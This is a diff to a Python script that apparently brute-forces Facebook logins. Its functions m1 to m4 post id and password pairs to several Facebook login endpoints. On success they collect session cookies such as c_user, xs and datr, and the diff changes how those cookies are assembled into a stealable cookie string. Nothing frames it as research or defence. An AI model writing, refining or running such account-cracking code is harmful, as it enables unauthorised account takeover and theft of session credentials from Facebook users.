@@ -1,4 +1,3 @@
-from os import path
 import os
 import uuid,base64,hashlib,zlib,subprocess,time,platform,pycurl
 import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
@@ -624,7 +623,7 @@ def m1(ids,pwv):
             session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
@@ -686,7 +685,7 @@ def m2(ids,pwv):
             session.post('https://m.alpha..facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2Fcancel%2F&li=6iKEZhsVXhKGcXY8k5F-hD3f&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
@@ -733,7 +732,7 @@ def m3(ids,pwv):
             session.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
@@ -796,7 +795,7 @@ def m4(ids,pwv):
             session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
